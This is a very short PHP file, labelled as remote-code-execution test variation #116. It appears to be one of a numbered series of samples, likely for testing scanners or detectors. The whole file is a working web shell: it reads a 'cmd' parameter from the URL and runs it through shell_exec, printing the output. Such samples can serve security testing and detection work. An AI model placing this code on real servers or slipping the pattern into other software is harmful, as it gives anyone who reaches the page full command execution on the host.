<?php
// RCE test variation #116
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>